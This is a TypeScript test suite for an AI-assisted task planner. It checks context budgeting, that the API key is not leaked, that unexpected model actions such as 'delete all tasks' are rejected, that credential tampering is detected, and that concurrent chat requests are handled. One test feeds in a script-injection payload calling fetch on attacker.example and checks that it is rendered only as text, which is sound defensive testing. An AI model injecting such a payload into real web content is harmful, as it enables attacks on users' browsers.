import test, { type TestContext } from 'node:test';
import assert from 'node:assert/strict';
import { randomUUID } from 'node:crypto';
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { once } from 'node:events';
import type { AddressInfo } from 'node:net';
import { createApp } from '../server/index.ts';
import { defaultSettings } from '../server/store.ts';
import { SecretStore } from '../server/secrets.ts';
import { AppError } from '../server/errors.ts';
import {
  assistantMessage,
  MAX_ASSISTANT_CONTEXT_CHARS,
  prepareAssistantInput,
} from '../server/assistant.ts';
import type { AssistantReply } from '../server/validation.ts';
import type { Conversation, Task, TaskInput } from '../shared/types.ts';

const fakeKey = 'sk-security-test-only-abcdefghijklmnopqrstuvwxyz';
const plainReply: AssistantReply = { text: 'Подготовил вариант.', steps: [], proposals: [] };
const taskInput: TaskInput = {
  title: 'Подготовить презентацию',
  description: '',
  date: '2099-10-14',
  time: '11:00',
  duration: 60,
  priority: 'high',
  repeat: 'none',
  kind: 'task',
  completed: false,
};
const stamp = '2099-10-12T04:00:00.000Z';
const makeTask = (patch: Partial<Task> = {}): Task => ({
  ...taskInput,
  id: randomUUID(),
  completedDates: [],
  createdAt: stamp,
  updatedAt: stamp,
  ...patch,
});

function removeOwnDirectory(dataDir: string) {
  const target = resolve(dataDir);
  assert.ok(
    target.startsWith(resolve(tmpdir()) + '\\') || target.startsWith(resolve(tmpdir()) + '/'),
  );
  assert.ok(target.includes('ritm-security-test-'));
  rmSync(target, { recursive: true, force: true });
}

function ownDirectory(t: TestContext, automaticCleanup = true) {
  const dataDir = mkdtempSync(join(tmpdir(), 'ritm-security-test-'));
  if (automaticCleanup) t.after(() => removeOwnDirectory(dataDir));
  return dataDir;
}

test('complete AI input stays within its budget even with escaped text and large recurrence histories', () => {
  const fixed = makeTask({
    title: 'Фиксированный созвон',
    kind: 'event',
    date: '2099-10-12',
    time: '11:00',
  });
  const dates = Array.from({ length: 5000 }, (_, index) => {
    const date = new Date('2020-01-01T12:00:00Z');
    date.setUTCDate(date.getUTCDate() + index);
    return date.toISOString().slice(0, 10);
  });
  const tasks = [
    fixed,
    ...Array.from({ length: 400 }, () =>
      makeTask({
        title: '"'.repeat(160),
        description: '\\"'.repeat(2000),
        repeat: 'daily',
        date: '2020-01-01',
        completedDates: dates,
      }),
    ),
  ];
  const conversation: Conversation = {
    id: randomUUID(),
    title: 'Большая история',
    createdAt: stamp,
    updatedAt: stamp,
    messages: Array.from({ length: 40 }, (_, index) => ({
      id: randomUUID(),
      role: index % 2 ? 'assistant' : 'user',
      text: '"\\\n'.repeat(3000),
      createdAt: stamp,
      proposals: [],
      steps: [],
    })),
  };
  const currentMessage = '"'.repeat(6000);
  const input = prepareAssistantInput(
    {
      apiKey: fakeKey,
      model: 'unused',
      settings: defaultSettings,
      tasks,
      conversation,
      message: currentMessage,
    },
    new Date(stamp),
  );
  assert.ok(JSON.stringify(input).length <= MAX_ASSISTANT_CONTEXT_CHARS);
  assert.equal(input.messages.at(-1)?.content, currentMessage);
  assert.equal(JSON.stringify(input).includes(fakeKey), false);
  const context = JSON.parse(input.instructions.slice(input.instructions.lastIndexOf('\n') + 1));
  assert.equal(context.totalTasks, tasks.length);
  assert.equal(context.includedTasks, context.tasks.length);
  assert.equal(context.tasks[0].id, fixed.id);
  assert.ok(context.tasks.length > 1 && context.tasks.length < tasks.length);
  assert.equal(context.contextLimit.tasksOmitted, true);
  assert.equal(context.contextLimit.historyShortened, true);
  assert.equal(context.contextLimit.taskDetailsShortened, true);
  const recurring = context.tasks.find((task: Task) => task.repeat === 'daily');
  assert.equal(recurring.completedDates.length, 90);
  assert.equal(recurring.completedDatesTotal, 5000);
  assert.equal(recurring.descriptionShortened, true);
  assert.equal(recurring.time, taskInput.time);
});

test('short prior step lists remain available for follow-up questions', () => {
  const conversation: Conversation = {
    id: randomUUID(),
    title: 'Презентация',
    createdAt: stamp,
    updatedAt: stamp,
    messages: [
      {
        id: randomUUID(),
        role: 'assistant',
        text: 'Три шага.',
        steps: ['Собрать факты', 'Подготовить слайды', 'Проверить демонстрацию'],
        proposals: [],
        createdAt: stamp,
      },
    ],
  };
  const input = prepareAssistantInput(
    {
      apiKey: fakeKey,
      model: 'unused',
      settings: defaultSettings,
      tasks: [],
      conversation,
      message: 'Уточни второй шаг',
    },
    new Date(stamp),
  );
  assert.match(input.messages[0].content, /2\. Подготовить слайды/);
});

test('duplicate or unexpected model actions fail validation and never become executable tools', () => {
  const task = makeTask();
  const change = {
    taskId: task.id,
    date: '2099-10-15',
    time: '10:00',
    duration: 60,
    reason: 'Свободное окно',
  };
  assert.throws(
    () => assistantMessage({ ...plainReply, proposals: [change, change] }, [task]),
    AppError,
  );
  assert.throws(
    () =>
      assistantMessage({ ...plainReply, execute: 'delete all tasks' } as AssistantReply, [task]),
    AppError,
  );
  assert.throws(
    () =>
      assistantMessage({ ...plainReply, proposals: [{ ...change, taskId: randomUUID() }] }, [task]),
    AppError,
  );
  const text = '<script>fetch("https://attacker.example")</script>';
  const message = assistantMessage({ ...plainReply, text }, [task]);
  assert.equal(message.text, text); // Data is rendered as text by React, with no HTML/URL interpreter.
  assert.deepEqual(message.proposals, []);
});

test('credential tampering is authenticated and env credentials take precedence without decrypting saved data', async (t) => {
  const dataDir = ownDirectory(t);
  const secrets = new SecretStore(dataDir, {});
  await secrets.save({ apiKey: fakeKey, model: 'gpt-6-luna' });
  const path = join(dataDir, 'openai-secret.json');
  const envelope = JSON.parse(readFileSync(path, 'utf8'));
  const ciphertext = Buffer.from(envelope.ciphertext, 'base64');
  ciphertext[0] ^= 1;
  writeFileSync(path, JSON.stringify({ ...envelope, ciphertext: ciphertext.toString('base64') }));
  await assert.rejects(
    secrets.status(),
    (error: unknown) =>
      error instanceof AppError &&
      error.code === 'SECRET_STORE_ERROR' &&
      !error.message.includes(fakeKey),
  );
  const environment = new SecretStore(dataDir, { OPENAI_API_KEY: fakeKey });
  assert.deepEqual(await environment.status(), {
    configured: true,
    model: 'gpt-6-luna',
    source: 'environment',
  });
  await assert.rejects(
    environment.remove(),
    (error: unknown) => error instanceof AppError && error.code === 'ENVIRONMENT_KEY',
  );
  await secrets.save({ apiKey: fakeKey, model: 'gpt-6-luna' });
  assert.equal((await secrets.status()).configured, true);
});

test(
  'in-flight chat blocks duplicate requests/deletion and preserves a concurrent confirmed proposal',
  { timeout: 15_000 },
  async (t) => {
    const dataDir = ownDirectory(t, false);
    let release!: () => void;
    let entered!: () => void;
    const pending = new Promise<void>((done) => {
      release = done;
    });
    const started = new Promise<void>((done) => {
      entered = done;
    });
    let calls = 0;
    const instance = createApp({
      dataDir,
      seed: false,
      env: { NODE_ENV: 'test', OPENAI_API_KEY: fakeKey },
      assistant: async (context) => {
        calls++;
        if (calls === 1)
          return {
            ...plainReply,
            proposals: [
              {
                taskId: context.tasks[0].id,
                date: '2099-10-15',
                time: '10:00',
                duration: 60,
                reason: 'Свободное окно',
              },
            ],
          };
        entered();
        await pending;
        return plainReply;
      },
    });
    const server = instance.app.listen(0, '127.0.0.1');
    await once(server, 'listening');
    t.after(async () => {
      release();
      server.closeAllConnections();
      await new Promise<void>((done) => server.close(() => done()));
      await instance.close();
      removeOwnDirectory(dataDir);
    });
    const url = `http://127.0.0.1:${(server.address() as AddressInfo).port}/api`;
    const call = async (path: string, method = 'POST', body?: unknown) => {
      const response = await fetch(url + path, {
        method,
        headers: { 'Content-Type': 'application/json' },
        ...(body === undefined ? {} : { body: JSON.stringify(body) }),
      });
      return { status: response.status, body: (await response.json()) as any };
    };
    const task = await instance.store.createTask(taskInput);
    const initial = await call('/chat', 'POST', {
      message: 'Предложи план',
      requestId: randomUUID(),
    });
    assert.equal(initial.status, 200);
    const conversation = initial.body as Conversation;
    const proposalMessage = conversation.messages[1];
    const input = {
      conversationId: conversation.id,
      message: 'Разбей задачу на шаги',
      requestId: randomUUID(),
    };
    const responsePending = call('/chat', 'POST', input);
    await started;
    assert.equal((await call('/chat', 'POST', input)).status, 409);
    assert.equal((await call('/chat', 'POST', { ...input, requestId: randomUUID() })).status, 409);
    assert.equal((await call(`/conversations/${conversation.id}`, 'DELETE')).status, 409);
    const applied = await call('/proposals/apply', 'POST', {
      conversationId: conversation.id,
      messageId: proposalMessage.id,
      proposalIds: [proposalMessage.proposals[0].id],
    });
    assert.equal(applied.status, 200);
    assert.equal((await instance.store.task(task.id)).date, '2099-10-15');
    release();
    const response = await responsePending;
    assert.equal(response.status, 200);
    assert.equal(response.body.messages.length, 4);
    assert.equal(response.body.messages[1].proposals[0].status, 'applied');
    const retried = await call('/chat', 'POST', input);
    assert.equal(retried.status, 200);
    assert.equal(retried.body.messages.length, 4);
    assert.equal(calls, 2);
  },
);
